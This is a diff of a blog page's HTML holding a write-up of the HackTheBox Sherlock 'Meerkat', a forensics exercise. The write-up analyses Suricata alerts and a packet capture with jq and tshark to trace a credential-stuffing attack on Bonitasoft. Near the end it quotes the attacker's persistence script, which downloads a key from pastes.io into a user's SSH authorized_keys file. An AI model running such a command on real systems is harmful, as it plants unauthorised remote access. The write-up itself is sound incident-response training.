@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Writeup of htb sherlock Meerkat rating: easy
-We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running? we can filter the meerkat-alerts.json with&amp;hellip;
-1 2 3 4 cat meerkat-alerts.json |jq |grep signature | grep -v python the bmp name is in the signature ans: Bonitasoft
+ We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?  we can filter the meerkat-alerts.json with&amp;hellip;
+1 2 3 4 5  cat meerkat-alerts.json |jq |grep signature | grep -v python the bmp name is in the signature   ans: Bonitasoft
 We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?'>
 <title>Htb Sherlock Meerkat</title>
 
@@ -11,8 +11,8 @@ We believe the attacker may have used a subset of the brute forcing attack categ
 
 <link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='Htb Sherlock Meerkat'>
 <meta property='og:description' content='Writeup of htb sherlock Meerkat rating: easy
-We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running? we can filter the meerkat-alerts.json with&amp;hellip;
-1 2 3 4 cat meerkat-alerts.json |jq |grep signature | grep -v python the bmp name is in the signature ans: Bonitasoft
+ We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?  we can filter the meerkat-alerts.json with&amp;hellip;
+1 2 3 4 5  cat meerkat-alerts.json |jq |grep signature | grep -v python the bmp name is in the signature   ans: Bonitasoft
 We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?'>
 <meta property='og:url' content='https://f0rk3b0mb.github.io/p/htb-sherlock-meerkat/'>
 <meta property='og:site_name' content='f0rk3b0mb'>
@@ -20,8 +20,8 @@ We believe the attacker may have used a subset of the brute forcing attack categ
 <meta name="twitter:site" content="@f0rk3b0mb">
     <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="Htb Sherlock Meerkat">
 <meta name="twitter:description" content="Writeup of htb sherlock Meerkat rating: easy
-We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running? we can filter the meerkat-alerts.json with&amp;hellip;
-1 2 3 4 cat meerkat-alerts.json |jq |grep signature | grep -v python the bmp name is in the signature ans: Bonitasoft
+ We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?  we can filter the meerkat-alerts.json with&amp;hellip;
+1 2 3 4 5  cat meerkat-alerts.json |jq |grep signature | grep -v python the bmp name is in the signature   ans: Bonitasoft
 We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?">
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
 <script>
@@ -421,13 +421,15 @@ if (!doNotTrack) {
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
+</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat meerkat-alerts.json |jq |grep signature | grep -v python
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">the bmp name is in the signature
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">cat meerkat-alerts.json |jq |grep signature | grep -v python
+
+
+the bmp name is in the signature
+
+</code></pre></td></tr></table>
 </div>
 </div><p>ans:  Bonitasoft</p>
 <ol start="2">
@@ -450,13 +452,15 @@ if (!doNotTrack) {
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
+</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tshark -r meerkat.pcap -Y &#34;http.request.method == POST&#34; -T fields -e http.request.uri | grep -i api
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">filter post requests , get the url path and grep for the api endpoints
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">tshark -r meerkat.pcap -Y &#34;http.request.method == POST&#34; -T fields -e http.request.uri | grep -i api
+
+
+filter post requests , get the url path and grep for the api endpoints
+
+</code></pre></td></tr></table>
 </div>
 </div><p>i18ntranslation</p>
 <ol start="5">
@@ -468,11 +472,15 @@ if (!doNotTrack) {
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">tshark -r meerkat.pcap -Y &#34;http.request.method == POST&#34; -T fields -e http.request.uri -e  http.file_data  | grep -v &#34;username=install&amp;password=install&amp;_l=en&#34; | grep -v &#34;/bonita/API/portal/page/;i18ntranslation&#34; | grep -v &#34;/bonita/API/pageUpload;i18ntranslation?action=add&#34; | uniq | wc -l
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">
+tshark -r meerkat.pcap -Y &#34;http.request.method == POST&#34; -T fields -e http.request.uri -e  http.file_data  | grep -v &#34;username=install&amp;password=install&amp;_l=en&#34; | grep -v &#34;/bonita/API/portal/page/;i18ntranslation&#34; | grep -v &#34;/bonita/API/pageUpload;i18ntranslation?action=add&#34; | uniq | wc -l
+
+
+</code></pre></td></tr></table>
 </div>
 </div><p>ans: 56</p>
 <ol start="6">
@@ -487,10 +495,12 @@ if (!doNotTrack) {
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tshark -r meerkat.pcap  -T fields -e  http.request.full_uri | uniq
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">tshark -r meerkat.pcap  -T fields -e  http.request.full_uri | uniq
+
+</code></pre></td></tr></table>
 </div>
 </div><p>ans: pastes.io</p>
 <ol start="8">
@@ -502,12 +512,14 @@ if (!doNotTrack) {
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
+</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys
-</span></span><span class="line"><span class="cl">sudo service ssh restart
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys
+sudo service ssh restart
+
+</code></pre></td></tr></table>
 </div>
 </div><p>ans: hffgra4unv</p>
 <ol start="9">
